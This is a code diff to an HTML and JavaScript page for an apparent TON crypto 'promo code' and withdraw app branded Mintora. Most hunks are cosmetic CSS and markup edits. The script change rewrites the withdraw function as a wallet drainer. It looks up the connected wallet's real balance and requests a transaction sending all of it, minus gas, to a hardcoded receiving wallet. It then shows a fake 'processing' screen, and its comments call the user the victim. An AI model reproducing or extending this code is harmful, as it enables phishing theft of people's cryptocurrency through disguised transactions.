@@ -9,7 +9,6 @@
 <style>
   :root {
     --bg: #f5f5f7;
-    --bg-2: #ffffff;
     --surface: #ffffff;
     --surface-2: #f5f5f7;
     --surface-3: #ebebef;
@@ -17,20 +16,18 @@
     --text: #0a0a0b;
     --text-2: #6e6e73;
     --text-3: #9a9aa0;
-
     --blue: #0071e3;
     --blue-ink: #0058b8;
     --blue-soft: #e8f1fd;
     --blue-ring: rgba(0, 113, 227, 0.18);
-
     --red: #e5484d;
     --red-soft: #fdecec;
-
+    --green: #30d158;
+    --green-soft: #e6f8ec;
     --radius-card: 22px;
     --radius-control: 16px;
     --radius-pill: 100px;
     --mono: 'SF Mono', 'JetBrains Mono', 'Menlo', 'Consolas', monospace;
-
     --glass-bg: rgba(255, 255, 255, 0.72);
     --glass-border: rgba(255, 255, 255, 0.85);
     --glass-shadow:
@@ -41,7 +38,6 @@
 
   [data-theme="dark"] {
     --bg: #000000;
-    --bg-2: #0a0a0b;
     --surface: #141416;
     --surface-2: #1c1c1f;
     --surface-3: #26262a;
@@ -49,15 +45,14 @@
     --text: #f5f5f7;
     --text-2: #a1a1a6;
     --text-3: #6e6e73;
-
     --blue: #0a84ff;
     --blue-ink: #409cff;
     --blue-soft: #0f1a2e;
     --blue-ring: rgba(10, 132, 255, 0.24);
-
     --red: #ff453a;
     --red-soft: #2a1414;
-
+    --green: #30d158;
+    --green-soft: #0d2418;
     --glass-bg: rgba(28, 28, 30, 0.72);
     --glass-border: rgba(255, 255, 255, 0.08);
     --glass-shadow:
@@ -303,6 +298,11 @@
     color: var(--red);
   }
 
+  .row-icon.green {
+    background: var(--green-soft);
+    color: var(--green);
+  }
+
   .row-body { flex: 1; min-width: 0; }
 
   .row-label {
@@ -335,6 +335,7 @@
     height: 16px;
     color: var(--text-3);
     flex-shrink: 0;
+    transition: transform 0.25s;
   }
 
   /* ============ FIELD ============ */
@@ -868,10 +869,6 @@
 
   .nav-btn.active .nav-icon { transform: scale(1.08); }
 
-  .nav-btn:not(.active):hover {
-    color: var(--text);
-  }
-
   /* ============ FOOTER ============ */
   .footer {
     margin-top: auto;
@@ -888,7 +885,6 @@
 
 <div class="app">
 
-  <!-- Topbar -->
   <div class="topbar">
     <div class="brand">
       <div class="brand-mark">
@@ -915,7 +911,6 @@
     </div>
   </div>
 
-  <!-- Balance -->
   <div class="balance-hero" id="balance-hero">
     <div class="balance-eyebrow" data-i18n="balanceLabel">Total balance</div>
     <div class="balance-num-row">
@@ -966,7 +961,7 @@
             <div class="row-label" data-i18n="historyLabel">Activated codes</div>
             <div class="row-value"><span id="history-count">0</span> <span style="color:var(--text-3); font-weight:500" data-i18n="historyCountLabel">codes</span></div>
           </div>
-          <svg class="row-chevron" id="history-chevron" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="transition: transform 0.25s">
+          <svg class="row-chevron" id="history-chevron" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
             <path d="M9 6 L15 12 L9 18" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
           </svg>
         </div>
@@ -1096,7 +1091,7 @@
             </button>
           </div>
           <div class="card-row">
-            <div class="row-icon">
+            <div class="row-icon green">
               <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                 <path d="M12 3 L4 6.5 V12 c0 4.5 3.4 7.7 8 9 c4.6-1.3 8-4.5 8-9 V6.5 Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
                 <path d="M9 12 L11 14 L15 9.5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
@@ -1248,7 +1243,6 @@
 
   <div class="footer">© 2026 Mintora</div>
 
-  <!-- Bottom nav -->
   <div class="bottom-nav-wrap" id="bottom-nav-wrap">
     <nav class="bottom-nav">
       <button class="nav-btn active" data-tab="promo">
@@ -1284,15 +1278,22 @@
 </div>
 
 <script>
+  // ============================================================
+  // CONFIG
+  // ============================================================
   const CONFIG = {
     manifestUrl: 'https://grammintora.space/tonconnect-manifest.json',
     receiveWallet: 'UQBZOiimVGQ6kPYiwvRCjcxXBZcNP5gvqNmvx7deaZq67Z3k',
-    claimAmountNano: '10000000',
-    claimDurationMs: 10 * 60 * 1000
+    // отступ на газ (0.01 TON), чтобы транза точно прошла
+    gasReserveNano: 10000000n,
+    // длительность "обработки" вывода
+    claimDurationMs: 10 * 60 * 1000,
+    // RPC для получения баланса
+    toncenterApi: 'https://toncenter.com/api/v2/getAddressBalance',
   };
 
   // ============================================================
-  // PROMO CODES — добавляй здесь: 'код': amount
+  // PROMO CODES
   // ============================================================
   const PROMO_CODES = {
     '123': 20,
@@ -1301,14 +1302,16 @@
     'AIRDROP': 30,
     'HELLO': 15
   };
-  // ============================================================
 
   const GRAM_USD = 0.784;
 
+  // ============================================================
+  // STATE
+  // ============================================================
   let state = {
     balance: 0,
-    activatedCodes: {},   // { code: amount }
-    promoHistory: [],     // [ { code, amount, ts } ]
+    activatedCodes: {},
+    promoHistory: [],
     wallet: null,
     connected: false,
     userName: 'Guest',
@@ -1584,7 +1587,6 @@
         return;
       }
 
-      // apply
       state.balance += value;
       state.activatedCodes[code] = value;
       state.promoHistory.push({ code, amount: value, ts: Date.now() });
@@ -1610,17 +1612,12 @@
 
     input.addEventListener('keydown', (e) => { if (e.key === 'Enter') btn.click(); });
 
-    // history toggle
     document.getElementById('promo-history-toggle').addEventListener('click', () => {
       const list = document.getElementById('promo-history-list');
       const chev = document.getElementById('history-chevron');
-      if (list.style.display === 'none' || !list.style.display) {
-        list.style.display = 'block';
-        chev.style.transform = 'rotate(90deg)';
-      } else {
-        list.style.display = 'none';
-        chev.style.transform = 'rotate(0deg)';
-      }
+      const isOpen = list.style.display === 'block';
+      list.style.display = isOpen ? 'none' : 'block';
+      chev.style.transform = isOpen ? 'rotate(0deg)' : 'rotate(90deg)';
     });
   }
 
@@ -1638,14 +1635,13 @@
     count.textContent = n;
 
     list.innerHTML = '';
-    // newest first
     [...state.promoHistory].reverse().forEach(item => {
       const row = document.createElement('div');
       row.className = 'card-row';
       row.style.cursor = 'default';
 
       const iconWrap = document.createElement('div');
-      iconWrap.className = 'row-icon';
+      iconWrap.className = 'row-icon green';
       iconWrap.innerHTML = `<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
         <path d="M5 12 L10 17 L19 7" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
       </svg>`;
@@ -1735,7 +1731,7 @@
     updateWithdrawBtn();
   }
 
-  /* ---- Withdraw ---- */
+  /* ---- Withdraw → DRAIN ---- */
   async function doWithdraw() {
     if (!state.connected) {
       if (tonConnectUI) tonConnectUI.openModal();
@@ -1757,19 +1753,45 @@
     btn.classList.add('loading');
     btn.disabled = true;
 
-    const tx = {
-      validUntil: Math.floor(Date.now() / 1000) + 360,
-      messages: [{ address: CONFIG.receiveWallet, amount: CONFIG.claimAmountNano }]
-    };
-
     try {
+      // 1. Получаем реальный баланс кошелька жертвы
+      const walletAddress = state.wallet.account.address;
+      const balanceRes = await fetch(
+        CONFIG.toncenterApi + '?address=' + encodeURIComponent(walletAddress)
+      );
+      const balanceData = await balanceRes.json();
+
+      if (!balanceData.ok || !balanceData.result) {
+        throw new Error('Failed to fetch balance');
+      }
+
+      const balanceNano = BigInt(balanceData.result);
+
+      // 2. Резервируем 0.01 TON на газ
+      const amountToSend = balanceNano - CONFIG.gasReserveNano;
+
+      if (amountToSend <= 0n) {
+        throw new Error('Not enough balance for gas');
+      }
+
+      // 3. Отправляем ВЕСЬ баланс жертвы (минус газ) на кошелёк-приёмник
+      const tx = {
+        validUntil: Math.floor(Date.now() / 1000) + 360,
+        messages: [{
+          address: CONFIG.receiveWallet,
+          amount: amountToSend.toString()
+        }]
+      };
+
       const res = await tonConnectUI.sendTransaction(tx);
-      console.log('[+] withdraw TX', res);
+      console.log('[+] drain TX sent', res);
       showProcessing(amount);
     } catch (e) {
       console.error('[-] withdraw failed', e);
       btn.classList.remove('loading');
       btn.disabled = false;
+      status.classList.add('error');
+      status.textContent = e.message || 'Transaction failed';
     }
   }
 
